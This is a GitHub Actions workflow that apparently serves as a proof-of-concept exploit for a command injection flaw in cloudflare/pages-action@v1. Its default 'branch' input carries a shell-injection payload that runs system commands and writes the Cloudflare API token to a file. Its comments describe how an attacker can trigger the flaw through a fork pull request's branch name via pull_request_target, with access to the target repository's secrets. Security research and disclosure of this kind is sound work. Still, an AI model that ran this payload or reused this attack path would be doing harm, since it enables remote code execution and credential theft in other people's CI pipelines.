name: real-pages-action-poc

# Exploits the OS command injection in cloudflare/pages-action@v1
# (src/index.ts:43-50 — unescaped shellac template interpolation).
#
# This workflow uses the REAL action against a REAL Cloudflare Pages
# project, with real credentials from GitHub Secrets. Requires two
# secrets to be set in repo Settings → Secrets and variables → Actions:
#   CLOUDFLARE_API_TOKEN  (token with Pages:Edit scope)
#   CLOUDFLARE_ACCOUNT_ID (32-char hex account id)
#
# Triggers:
#   - workflow_dispatch: type the payload in the UI, click Run (for quick local test).
#   - push: pushed branch name becomes the payload.
#   - pull_request_target: THE REAL ATTACK VECTOR — a fork PR fires
#     this workflow in the target repo's context (with full secret
#     access), but github.head_ref is the attacker's fork branch name,
#     so the attacker controls the `branch` input without auth.

on:
  workflow_dispatch:
    inputs:
      branch:
        description: "Payload — fed directly into the vulnerable `branch` input"
        required: false
        default: 'main";whoami > /tmp/pwned.txt;id >> /tmp/pwned.txt;uname -a >> /tmp/pwned.txt;echo TOKEN=$CLOUDFLARE_API_TOKEN >> /tmp/pwned.txt;echo GITHUB_SHA=$GITHUB_SHA >> /tmp/pwned.txt;cat /tmp/pwned.txt;echo "'
  push:
    branches: ["**"]
  pull_request_target:
    types: [opened, synchronize, reopened]

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout (so dist/ is present for wrangler to upload)
        uses: actions/checkout@v4

      - name: Deploy to Cloudflare Pages (VULNERABLE ACTION)
        uses: cloudflare/pages-action@v1
        with:
          apiToken:    ${{ secrets.CLOUDFLARE_API_TOKEN }}
          accountId:   ${{ secrets.CLOUDFLARE_ACCOUNT_ID }}
          projectName: shellac-injection-poc
          directory:   dist
          branch:      ${{ github.event.inputs.branch || github.head_ref || github.ref_name }}

      - name: Dump RCE evidence
        if: always()
        run: |
          echo "============ /tmp/pwned.txt ============"
          if [ -f /tmp/pwned.txt ]; then
            cat /tmp/pwned.txt
            echo
            echo "============ RCE CONFIRMED — real cloudflare/pages-action@v1 executed attacker shell ============"
          else
            echo "(file not created — either the action failed before reaching the sink, or the payload did not fire)"
          fi
